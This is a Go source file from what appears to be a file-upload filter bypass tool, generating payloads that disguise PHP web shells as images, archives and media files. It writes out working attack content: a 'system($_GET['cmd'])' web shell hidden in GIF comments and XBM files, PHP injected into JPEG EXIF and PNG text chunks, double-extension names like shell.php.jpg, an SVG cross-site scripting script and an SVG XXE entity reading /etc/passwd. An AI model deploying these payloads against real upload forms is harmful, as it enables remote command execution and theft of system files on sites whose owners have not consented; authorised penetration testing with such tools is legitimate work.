package bypass

import (
	"fux/config"
)

// MagicBytesPayloads generates payloads with magic byte headers
func MagicBytesPayloads(baseContent []byte) []config.BypassPayload {
	var payloads []config.BypassPayload

	// Magic bytes for different file types
	magicBytes := map[string]struct {
		bytes    []byte
		mime     string
		desc     string
		filename string
	}{
		// Images
		"jpeg": {
			bytes:    []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46},
			mime:     "image/jpeg",
			desc:     "JPEG Magic",
			filename: "shell.php",
		},
		"jpeg_exif": {
			bytes:    []byte{0xFF, 0xD8, 0xFF, 0xE1},
			mime:     "image/jpeg",
			desc:     "JPEG EXIF Magic",
			filename: "shell.php",
		},
		"png": {
			bytes:    []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A},
			mime:     "image/png",
			desc:     "PNG Magic",
			filename: "shell.php",
		},
		"gif87a": {
			bytes:    []byte("GIF87a"),
			mime:     "image/gif",
			desc:     "GIF87a Magic",
			filename: "shell.php",
		},
		"gif89a": {
			bytes:    []byte("GIF89a"),
			mime:     "image/gif",
			desc:     "GIF89a Magic",
			filename: "shell.php",
		},
		"bmp": {
			bytes:    []byte{0x42, 0x4D},
			mime:     "image/bmp",
			desc:     "BMP Magic",
			filename: "shell.php",
		},
		"webp": {
			bytes:    []byte{0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50},
			mime:     "image/webp",
			desc:     "WebP Magic",
			filename: "shell.php",
		},
		"ico": {
			bytes:    []byte{0x00, 0x00, 0x01, 0x00},
			mime:     "image/x-icon",
			desc:     "ICO Magic",
			filename: "shell.php",
		},
		"tiff_le": {
			bytes:    []byte{0x49, 0x49, 0x2A, 0x00},
			mime:     "image/tiff",
			desc:     "TIFF Little Endian Magic",
			filename: "shell.php",
		},
		"tiff_be": {
			bytes:    []byte{0x4D, 0x4D, 0x00, 0x2A},
			mime:     "image/tiff",
			desc:     "TIFF Big Endian Magic",
			filename: "shell.php",
		},

		// Documents
		"pdf": {
			bytes:    []byte("%PDF-1.7"),
			mime:     "application/pdf",
			desc:     "PDF Magic",
			filename: "shell.php",
		},
		"zip": {
			bytes:    []byte{0x50, 0x4B, 0x03, 0x04},
			mime:     "application/zip",
			desc:     "ZIP Magic",
			filename: "shell.php",
		},
		"rar": {
			bytes:    []byte{0x52, 0x61, 0x72, 0x21, 0x1A, 0x07},
			mime:     "application/x-rar-compressed",
			desc:     "RAR Magic",
			filename: "shell.php",
		},
		"gzip": {
			bytes:    []byte{0x1F, 0x8B, 0x08},
			mime:     "application/gzip",
			desc:     "GZIP Magic",
			filename: "shell.php",
		},
		"7z": {
			bytes:    []byte{0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C},
			mime:     "application/x-7z-compressed",
			desc:     "7-Zip Magic",
			filename: "shell.php",
		},
		"exe": {
			bytes:    []byte{0x4D, 0x5A},
			mime:     "application/x-msdownload",
			desc:     "EXE/PE Magic",
			filename: "shell.php",
		},

		// Media
		"mp3": {
			bytes:    []byte{0x49, 0x44, 0x33},
			mime:     "audio/mpeg",
			desc:     "MP3 ID3 Magic",
			filename: "shell.php",
		},
		"mp4": {
			bytes:    []byte{0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70},
			mime:     "video/mp4",
			desc:     "MP4 Magic",
			filename: "shell.php",
		},
		"avi": {
			bytes:    []byte{0x52, 0x49, 0x46, 0x46},
			mime:     "video/x-msvideo",
			desc:     "AVI Magic",
			filename: "shell.php",
		},
		"wav": {
			bytes:    []byte{0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45},
			mime:     "audio/wav",
			desc:     "WAV Magic",
			filename: "shell.php",
		},
		"flv": {
			bytes:    []byte{0x46, 0x4C, 0x56},
			mime:     "video/x-flv",
			desc:     "FLV Magic",
			filename: "shell.php",
		},
	}

	// Generate payloads with magic bytes prepended
	for _, m := range magicBytes {
		content := append(m.bytes, baseContent...)

		payloads = append(payloads, config.BypassPayload{
			Name:        m.desc + " Header",
			FileName:    m.filename,
			Content:     content,
			ContentType: m.mime,
			Category:    "magic-bytes",
		})

		// Also try with double extension
		payloads = append(payloads, config.BypassPayload{
			Name:        m.desc + " with Double Ext",
			FileName:    "shell.php.jpg",
			Content:     content,
			ContentType: m.mime,
			Category:    "magic-double-ext",
		})
	}

	// GIF with PHP in comment section
	gifWithComment := []byte("GIF89a/*<?php system($_GET['cmd']); ?>*/=0;")
	payloads = append(payloads, config.BypassPayload{
		Name:        "GIF with PHP Comment",
		FileName:    "shell.gif",
		Content:     gifWithComment,
		ContentType: "image/gif",
		Category:    "magic-comment",
	})

	// JPEG with PHP in EXIF
	jpegExifPayload := buildJPEGWithEXIF(baseContent)
	payloads = append(payloads, config.BypassPayload{
		Name:        "JPEG with EXIF PHP",
		FileName:    "shell.jpg",
		Content:     jpegExifPayload,
		ContentType: "image/jpeg",
		Category:    "exif-injection",
	})

	// PNG with tEXt chunk containing PHP
	pngTextPayload := buildPNGWithText(baseContent)
	payloads = append(payloads, config.BypassPayload{
		Name:        "PNG with tEXt PHP",
		FileName:    "shell.png",
		Content:     pngTextPayload,
		ContentType: "image/png",
		Category:    "png-text-chunk",
	})

	// SVG with embedded script (XSS/XXE vector too)
	svgPayload := []byte(`<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<script type="text/javascript">alert('XSS')</script>
</svg>`)
	payloads = append(payloads, config.BypassPayload{
		Name:        "SVG with Script",
		FileName:    "shell.svg",
		Content:     svgPayload,
		ContentType: "image/svg+xml",
		Category:    "svg-script",
	})

	// SVG with XXE
	svgXXE := []byte(`<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>`)
	payloads = append(payloads, config.BypassPayload{
		Name:        "SVG with XXE",
		FileName:    "shell.svg",
		Content:     svgXXE,
		ContentType: "image/svg+xml",
		Category:    "svg-xxe",
	})

	// XBM image (can contain PHP)
	xbmPayload := []byte(`#define shell_width 1
#define shell_height 1
<?php system($_GET['cmd']); ?>
static unsigned char shell_bits[] = { 0x00 };`)
	payloads = append(payloads, config.BypassPayload{
		Name:        "XBM with PHP",
		FileName:    "shell.xbm",
		Content:     xbmPayload,
		ContentType: "image/x-xbitmap",
		Category:    "xbm-php",
	})

	return payloads
}

// buildJPEGWithEXIF creates a minimal JPEG with PHP in EXIF comment
func buildJPEGWithEXIF(phpCode []byte) []byte {
	// JPEG SOI marker
	jpeg := []byte{0xFF, 0xD8}

	// APP1 EXIF segment
	jpeg = append(jpeg, 0xFF, 0xE1)

	// Segment size (2 bytes) - will be calculated
	exifData := []byte("Exif\x00\x00")
	exifData = append(exifData, phpCode...)

	segmentSize := uint16(len(exifData) + 2)
	jpeg = append(jpeg, byte(segmentSize>>8), byte(segmentSize&0xFF))
	jpeg = append(jpeg, exifData...)

	// Add minimal JPEG data
	jpeg = append(jpeg, 0xFF, 0xD9) // EOI marker

	return jpeg
}

// buildPNGWithText creates a minimal PNG with PHP in tEXt chunk
func buildPNGWithText(phpCode []byte) []byte {
	// PNG signature
	png := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}

	// Minimal IHDR chunk
	ihdr := []byte{
		0x00, 0x00, 0x00, 0x0D, // Length: 13
		0x49, 0x48, 0x44, 0x52, // Type: IHDR
		0x00, 0x00, 0x00, 0x01, // Width: 1
		0x00, 0x00, 0x00, 0x01, // Height: 1
		0x08, 0x02, // Bit depth: 8, Color type: 2 (RGB)
		0x00, 0x00, 0x00, // Compression, Filter, Interlace
		0x90, 0x77, 0x53, 0xDE, // CRC (precomputed for this IHDR)
	}
	png = append(png, ihdr...)

	// tEXt chunk with PHP
	textChunk := []byte("tEXt")
	textChunk = append(textChunk, []byte("Comment\x00")...)
	textChunk = append(textChunk, phpCode...)

	length := uint32(len(textChunk) - 4) // -4 for chunk type
	png = append(png, byte(length>>24), byte(length>>16), byte(length>>8), byte(length))
	png = append(png, textChunk...)
	png = append(png, 0x00, 0x00, 0x00, 0x00) // CRC placeholder

	// IEND chunk
	iend := []byte{
		0x00, 0x00, 0x00, 0x00, // Length: 0
		0x49, 0x45, 0x4E, 0x44, // Type: IEND
		0xAE, 0x42, 0x60, 0x82, // CRC
	}
	png = append(png, iend...)

	return png
}
